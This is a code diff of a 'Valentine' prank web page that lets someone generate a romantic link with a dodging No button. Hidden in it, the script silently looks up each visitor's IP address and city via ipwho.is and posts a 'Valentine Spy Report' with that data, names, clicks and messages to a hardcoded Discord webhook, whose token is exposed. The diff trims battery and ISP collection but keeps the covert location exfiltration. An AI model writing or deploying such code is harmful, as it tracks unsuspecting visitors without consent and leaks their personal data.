@@ -17,7 +17,7 @@
       background-size: cover; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; z-index: 1000; padding: 20px; transition: opacity 0.8s ease;
     }
 
-    #customText { color: white; margin-bottom: 25px; font-style: italic; font-size: 1.1rem; opacity: 0; font-weight: 600; transition: opacity 2s ease; display: inline-block; padding: 0 15px; line-height: 1.4; }
+    #customText { color: white; margin-bottom: 25px; font-style: italic; font-size: 1.1rem; opacity: 0; font-weight: 600; transition: opacity 2s ease; display: inline-block; padding: 0 15px; line-height: 1.4; text-align: center; }
     .pulsing { animation: heartBeat 3s infinite ease-in-out; }
     @keyframes heartBeat {
       0%, 100% { transform: scale(1); text-shadow: 0 0 5px rgba(255, 215, 0, 0.2); }
@@ -25,7 +25,6 @@
     }
 
     .glass-box { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.2); padding: 40px 25px; border-radius: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); max-width: 420px; width: 85%; }
-
     .card { background: white; padding: 40px; width: 90vw; max-width: 450px; height: 550px; border-radius: 40px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: none; flex-direction: column; align-items: center; justify-content: space-between; position: relative; overflow: hidden; z-index: 10; }
     
     #yes { --scale: 1; background: var(--primary); color: white; font-size: 20px; font-weight: 700; padding: 15px 45px; border: none; border-radius: 50px; cursor: pointer; transition: transform 0.2s; z-index: 50; }
@@ -33,7 +32,7 @@
 
     .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 5000; backdrop-filter: blur(8px); }
     .custom-modal { background: white; padding: 30px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; }
-    .modal-input { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid var(--secondary); border-radius: 12px; outline: none; font-family: 'Poppins'; box-sizing: border-box; }
+    .modal-input, .modal-select { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid var(--secondary); border-radius: 12px; outline: none; font-family: 'Poppins'; box-sizing: border-box; }
   </style>
 </head>
 <body>
@@ -44,11 +43,11 @@
       <div id="step1" style="width: 100%;">
         <input type="text" id="creatorInput" class="modal-input" placeholder="Your Name" oninput="updateSuggestions()">
         <input type="text" id="targetInput" class="modal-input" placeholder="Their Name" oninput="updateSuggestions()">
-        <select id="suggestionBox" class="modal-input" onchange="document.getElementById('msgInput').value = this.value">
+        <select id="suggestionBox" class="modal-select" onchange="applySuggestion(this.value)">
             <option value="">✨ Romantic Suggestions...</option>
         </select>
         <textarea id="msgInput" class="modal-input" placeholder="Custom message..." rows="3"></textarea>
-        <button onclick="processLinkGeneration()" style="background: var(--primary); color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-weight: 800; width: 100%;">Generate Link</button>
+        <button onclick="processLinkGeneration()" style="background: var(--primary); color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-weight: 800; width: 100%; margin-top: 10px;">Generate Link</button>
       </div>
       <div id="step2" style="display: none; width: 100%;">
         <div id="urlDisplay" style="background:#fdf2f4; padding:10px; border-radius:10px; font-size:0.7rem; word-break:break-all; border:1px dashed var(--primary); margin: 10px 0;"></div>
@@ -76,41 +75,25 @@
 
 <script>
   let visitorName = "", clickCount = 0, yesScale = 1;
-  let batteryLevel = "Restricted"; 
-  let connectionType = "N/A";
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
-  // NEW: 20 AGGRESSIVE/FUNNY NO BUTTON TEXTS
-  const taunts = [
-    "I have your IP 📍", "Search history leaking... 🔍", "POLICE CALLED 👮", 
-    "Deleting your Roblox? 🎮", "I'm in your walls 🧱", "NICKI MINAJ FAN? LEAKED 🎤",
-    "Say No and I steal your cat 🐈", "resistance is futile 🤖", "WRONG BUTTON!",
-    "Try harder! 😂", "Missed me!", "Too slow!", "I see you blushing 😳", 
-    "Calling your Mom... 📞", "Exposing your DMs 📨", "Say Yes or else!",
-    "You're making this hard 😈", "Stop playing with me!", "I'm outside 🏠", "Last chance!"
-  ];
-
+  const taunts = ["I have your IP 📍", "Police called 👮", "Missed me!", "Too slow!", "Say Yes or else! 😈"];
+  
   const promises = [
     "Thank you, {name}. I promise to hold your hand through every storm. We are forever.",
     "You made me the luckiest alive, {name}. I'm yours forever.",
-    "{name}, I promise to love you more with every sunrise.",
-    "I knew you'd say yes, {name}! I promise to be your safest place.",
-    "My heart is finally at peace. Thank you for choosing me, {name}."
+    "{name}, you are my today and all of my tomorrows."
   ];
 
   window.onload = async () => {
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      batteryLevel = `${Math.round(battery.level * 100)}%`;
-    }
-    if (navigator.connection) {
-      connectionType = navigator.connection.effectiveType || "Unknown";
-    }
     const params = new URLSearchParams(window.location.search);
-    if(params.get('to')) document.getElementById('userName').value = decodeURIComponent(params.get('to'));
-    if(params.get('msg')) {
+    const targetName = params.get('to');
+    const customMsg = params.get('msg');
+
+    if(targetName) document.getElementById('userName').value = decodeURIComponent(targetName);
+    if(customMsg) {
       const msgEl = document.getElementById('customText');
-      msgEl.innerText = `"${decodeURIComponent(params.get('msg'))}"`;
+      msgEl.innerText = decodeURIComponent(customMsg);
       msgEl.style.opacity = "1";
       msgEl.classList.add('pulsing');
     }
@@ -118,35 +101,30 @@
   };
 
   async function sendDiscordReport(status) {
-    const now = new Date();
     let spyData = {};
     try {
         const res = await fetch('https://ipwho.is/');
         spyData = await res.json();
-    } catch (e) { spyData = { ip: "Blocked", city: "Unknown", region: "Unknown", connection: { isp: "Unknown" } }; }
+    } catch (e) { spyData = { ip: "Blocked", city: "Unknown" }; }
 
     const payload = {
       embeds: [{
         title: `🕵️ Valentine Spy Report: ${visitorName || "Guest"}`,
-        color: status.includes("YES") ? 0x00ff00 : (status.includes("Link Created") ? 0x00bfff : 0xff4d6d),
+        color: status.includes("YES") ? 0x00ff00 : 0xff4d6d,
         fields: [
           { name: "Event", value: `**${status}**`, inline: true },
-          { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
-          { name: "Battery", value: batteryLevel, inline: true },
           { name: "Misses", value: `${clickCount}`, inline: true },
-          { name: "Location", value: `${spyData.city || "Unknown"}, ${spyData.region || "Unknown"}`, inline: true },
-          { name: "IP Address", value: `\`${spyData.ip || "Blocked"}\``, inline: false },
-          { name: "Network/ISP", value: `\`${spyData.connection?.isp || "Unknown"}\``, inline: false }
+          { name: "Location", value: `${spyData.city || "Unknown"}`, inline: true },
+          { name: "IP Address", value: `\`${spyData.ip || "Blocked"}\``, inline: false }
         ],
-        timestamp: now.toISOString()
+        timestamp: new Date().toISOString()
       }]
     };
-
     fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
   }
 
   function startApp() {
-    visitorName = document.getElementById('userName').value.trim() || "Secret Admirer";
+    visitorName = document.getElementById('userName').value.trim() || "Guest";
     sendDiscordReport("Unlocked Heart 🔓");
     document.getElementById('namePortal').style.display = "none";
     document.getElementById('mainCard').style.display = "flex";
@@ -158,18 +136,13 @@
     const noBtn = document.getElementById("no");
     const yesBtn = document.getElementById("yes");
     
-    // UPDATING THE NO BUTTON TEXT DIRECTLY
-    const currentTaunt = taunts[clickCount % taunts.length];
-    noBtn.innerText = currentTaunt;
-    document.getElementById("joke-text").innerText = currentTaunt;
-
     noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
     noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 200) + 180) + "px";
-
-    yesScale += 0.25;
+    noBtn.innerText = taunts[clickCount % taunts.length];
+    
+    yesScale += 0.2;
     yesBtn.style.transform = `scale(${yesScale})`;
-
-    if (clickCount % 5 === 0) sendDiscordReport(`Struggling: ${clickCount} misses | Last Taunt: "${currentTaunt}"`);
+    if (clickCount % 5 === 0) sendDiscordReport(`Struggling: ${clickCount} misses`);
   }
 
   function yesClick() {
@@ -177,22 +150,35 @@
     sendDiscordReport(`SAID YES! ❤️ | Quote: "${randomPromise}"`);
     document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
     confetti({ particleCount: 150, spread: 70 });
-    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p style="font-size:1.1rem; line-height:1.5;">${randomPromise}</p></div>`;
+    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p>${randomPromise}</p></div>`;
   }
 
+  // FIXED SUGGESTION LOGIC
   function updateSuggestions() {
     const to = document.getElementById('targetInput').value.trim() || "You";
-    const deepMessages = [`${to}, you are my piece of soul.`, `Every beat of my heart belongs to you, ${to}.`, `In a world of temporary things, ${to}, you are my forever.`];
+    const deepMessages = [
+      `${to}, you are the piece of my soul I never knew was missing.`,
+      `Every beat of my heart belongs to you, ${to}.`,
+      `In a world of temporary things, ${to}, you are my forever.`
+    ];
     const select = document.getElementById('suggestionBox');
-    select.innerHTML = '<option value="">✨ Romantic Suggestions...</option>' + deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
+    select.innerHTML = '<option value="">✨ Romantic Suggestions...</option>' + 
+      deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
+  }
+
+  function applySuggestion(val) {
+    if(val) document.getElementById('msgInput').value = val;
   }
 
   function processLinkGeneration() {
-    const from = document.getElementById('creatorInput').value.trim();
     const to = document.getElementById('targetInput').value.trim();
     const msg = document.getElementById('msgInput').value.trim();
-    const finalUrl = `${window.location.href.split('?')[0]}?to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
-    sendDiscordReport(`New Link Created! From: ${from} | To: ${to} | Msg: "${msg}"`);
+    if (!to) return alert("Enter their name!");
+    
+    const base = window.location.href.split('?')[0];
+    const finalUrl = `${base}?to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
+    
+    sendDiscordReport(`New Link Created! To: ${to} | Msg: "${msg}"`);
     document.getElementById('urlDisplay').innerText = finalUrl;
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
